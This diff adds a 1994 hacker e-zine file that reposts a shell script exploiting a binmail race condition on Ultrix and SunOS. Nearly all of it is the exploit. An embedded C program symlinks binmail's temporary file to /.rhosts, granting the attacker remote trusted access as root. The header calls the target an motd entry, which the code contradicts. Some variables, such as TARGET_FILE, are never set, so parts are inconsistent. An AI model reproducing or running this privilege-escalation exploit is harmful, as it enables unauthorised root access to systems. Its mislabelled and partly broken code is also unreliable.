@@ -1,0 +1,100 @@
+=================================[MiNDCRiME]==================================
+[FiLE #2:]
+ 
+[Here's the latest binmail script. I don't know how many of you have it, 
+but here it is. This is courtesy of zomo. ]
+ 
+From zomo@narqlinq.net23.com Sat Oct  8 10:28:21 1994
+Date: Sat, 8 Oct 1994 10:01:48 -0500
+From: zomo@narqlinq.net23.com
+ 
+#!/bin/sh 
+# 
+# This exploits a flaw in Ultrix/SunOS binmail(1), and attempts 
+# to embarrass the admin, by creating an motd entry.
+#
+# Written 1994 by Nate Lawson <nlawson@galaxy.calpoly.edu>
+# Minor Revisions by Chris Ellwood <cellwood@gauss.calpoly.edu>
+# Thanks go to 8lgm for the basic script format.
+ 
+PATH=/usr/ucb:/usr/bin:/bin      export PATH
+IFS=" "                          export IFS
+PROG="`basename $0`"
+ME="`whoami`"
+PWENT="`hostname` `whoami`"
+ 
+cat > race.c << 'EOF'
+ 
+#define TARGET "/.rhosts"
+ 
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+ 
+int main( ac,av)  int ac; char **av;
+{
+        unsigned int pid,bpid;  /* Some machines don't have pid_t */
+        int i;
+        char target[13];
+        strcpy (target,"/tmp/maa");  
+                /* General format for binmail temp names */
+ 
+                if ((pid = fork())==0) { 
+                   sleep (2);
+                   nice (19);  /* Increase our chances and ... */
+                   execl ("/bin/mail","mail",0); /* Fork binmail */
+                }
+ 
+        bpid=pid;  /* back up our pid for a later time */
+ 
+        for (i=11;i>=8;i--) {
+           target[i]=(pid%10) + '0'; 
+                /* Make the name for the tempfile */
+                pid /= 10;
+        }
+        while (!symlink(TARGET,target)) unlink (target); 
+                /* Point that mktemp()'d file to the pot of gold */
+        while (symlink(TARGET,target)) unlink (target); 
+                /* Probably not necessary, but what the heck */
+ 
+        kill(bpid,1);  /* Clean up, don't want to lag the system */     
+}
+ 
+EOF
+ 
+cc -O -s -o race race.c
+ 
+# Check we now have race
+if [ ! -x "race" ]; then
+        echo "$PROG: couldnt compile race.c - lame!"
+        exit 1
+fi
+ 
+OLD_TARGET_LEN=`ls -ld $TARGET_FILE |awk -F' ' '{print $4}'` 2>/dev/null
+NEW_TARGET_LEN=$OLD_TARGET_LEN
+ 
+cp /usr/spool/mail/$ME /tmp/$$          # Backup the mail spool.. we need it
+cp /dev/null /usr/spool/mail/$ME
+echo ""  >> /usr/spool/mail/$ME
+echo $PWENT >> /usr/spool/mail/$ME
+echo ""  >> /usr/spool/mail/$ME
+ 
+while [ "x$NEW_TARGET_LEN" = "x$OLD_TARGET_LEN" ]; do
+     ./race &
+     RACE_PID=$!
+     sleep 4
+     NEW_TARGET_LEN=`ls -ld $TARGET_FILE |awk -F' ' '{print $4}'` 2>/dev/null
+     kill -9 $RACE_PID
+done
+ 
+# We won the race
+echo "Succeeded.."
+# Add back our spool.. don't want to lose our mail.
+cp /dev/null /usr/spool/$ME
+cp /tmp/$$ /usr/spool/mail/$ME  
+rm -f /tmp/$$ race race.c
+exit 0
+ 
+=================================[MiNDCRiME]==================================
+ 
+ 
